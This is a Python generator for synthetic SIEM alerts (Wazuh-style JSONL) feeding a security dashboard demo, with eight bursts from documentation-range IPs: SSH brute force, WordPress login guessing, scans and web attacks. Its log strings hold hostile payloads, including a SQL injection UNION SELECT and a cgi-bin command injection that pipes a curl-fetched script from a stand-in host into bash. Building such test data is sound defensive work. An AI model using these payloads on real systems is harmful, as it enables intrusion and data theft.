"""Deterministically generate data/synthetic_alerts/srcip_demo.jsonl.

Eight distinct external source IPs (RFC 5737 TEST-NET ranges — never real hosts),
one per edge host, each a short burst inside a 30-min window so it correlates
into its own incident. Gives the "Top source IPs" panel and the timeline real
data to show. Run:  python data/synthetic_alerts/gen_srcip_demo.py
"""
from __future__ import annotations

import json
from datetime import datetime, timedelta
from pathlib import Path

OUT = Path(__file__).with_name("srcip_demo.jsonl")
DAY0 = datetime(2026, 8, 30, 9, 0)  # fixed, like batch01/02
_seq = 0


def _iso(dt: datetime) -> str:
    return dt.strftime("%Y-%m-%dT%H:%M:%S") + ".000+0000"


def A(minute, host, srcip, rid, level, desc, groups, mitre, full_log, *, dstip=None):
    global _seq
    _seq += 1
    data = {"srcip": srcip}
    if dstip:
        data["dstip"] = dstip
    return {
        "timestamp": _iso(DAY0 + timedelta(minutes=minute)),
        "id": f"sd-{_seq:04d}",
        "rule": {"id": str(rid), "level": level, "description": desc, "groups": list(groups),
                 "mitre": {"id": [mitre[0]], "tactic": [mitre[1]], "technique": [mitre[2]]}},
        "agent": {"name": host},
        "manager": {"name": "wazuh.manager"},
        "decoder": {"name": "synthetic"},
        "data": data,
        "full_log": full_log,
        "location": "/var/log/synthetic",
    }


rows: list[dict] = []

# t is minutes from DAY0; each burst stays well inside the 30-min correlation window.
# 1. SSH brute force that succeeds
for i in range(6):
    rows.append(A(0 + i, "edge-01", "203.0.113.10", 5710, 5,
                  "sshd: Attempt to login using a non-existent user.",
                  ["syslog", "sshd", "authentication_failed", "brute force"],
                  ("T1110", "Credential Access", "Brute Force"),
                  "invalid user admin from 203.0.113.10 port 51000"))
rows.append(A(7, "edge-01", "203.0.113.10", 5715, 3, "sshd: authentication success.",
              ["syslog", "sshd", "authentication_success"],
              ("T1078", "Persistence", "Valid Accounts"),
              "Accepted password for backup from 203.0.113.10 port 51999"))

# 2. Web SQL injection
for i in range(4):
    rows.append(A(45 + i, "web-11", "198.51.100.23", 31103, 7, "SQL injection attempt.",
                  ["web", "accesslog", "attack", "sql_injection"],
                  ("T1190", "Initial Access", "Exploit Public-Facing Application"),
                  "GET /p.php?id=1' UNION SELECT username,password FROM users-- 200"))

# 3. SSH port / service scan
for i in range(5):
    rows.append(A(90 + i, "dmz-01", "192.0.2.44", 5710, 5,
                  "sshd: Attempt to login using a non-existent user (port scan).",
                  ["syslog", "sshd", "recon", "port scan"],
                  ("T1595", "Reconnaissance", "Active Scanning"),
                  "invalid user from 192.0.2.44 (port scan pattern)"))

# 4. WordPress login brute force
for i in range(6):
    rows.append(A(135 + i, "web-12", "203.0.113.77", 31151, 5,
                  "Multiple web server 400 error codes from same source ip (brute force).",
                  ["web", "accesslog", "attack", "brute force"],
                  ("T1110", "Credential Access", "Brute Force"),
                  "POST /wp-login.php 401 from 203.0.113.77"))

# 5. A few SSH invalid-user hits
for i in range(3):
    rows.append(A(180 + i, "edge-02", "198.51.100.9", 5710, 5,
                  "sshd: Attempt to login using a non-existent user.",
                  ["syslog", "sshd", "authentication_failed"],
                  ("T1078", "Initial Access", "Valid Accounts"),
                  "invalid user oracle from 198.51.100.9 port 40222"))

# 6. SSH brute force — max attempts exceeded
for i in range(5):
    rows.append(A(225 + i, "dmz-02", "192.0.2.130", 5712, 10,
                  "sshd: brute force trying to get access to the system.",
                  ["syslog", "sshd", "authentication_failures", "brute force"],
                  ("T1110", "Credential Access", "Brute Force"),
                  "maximum authentication attempts exceeded for root from 192.0.2.130"))

# 7. Command injection with an outbound callback
rows.append(A(270, "web-11", "203.0.113.200", 31103, 12,
              "Command injection via cgi-bin (union select payload).",
              ["web", "attack", "command_injection"],
              ("T1190", "Initial Access", "Exploit Public-Facing Application"),
              "GET /cgi-bin/status?x=;curl 203.0.113.200/sh|bash 500", dstip="203.0.113.200"))

# 8. CGI vulnerability scanner
for i in range(4):
    rows.append(A(300 + i, "dmz-01", "198.51.100.55", 31103, 6,
                  "Web scan for known vulnerable cgi-bin scripts.",
                  ["web", "accesslog", "recon"],
                  ("T1595", "Reconnaissance", "Active Scanning"),
                  "GET /cgi-bin/php-cgi?-d+allow_url_include 404 from 198.51.100.55"))

OUT.write_text("\n".join(json.dumps(r) for r in rows) + "\n", encoding="utf-8")
print(f"wrote {len(rows)} alerts across "
      f"{len({r['data']['srcip'] for r in rows})} source IPs -> {OUT.name}")
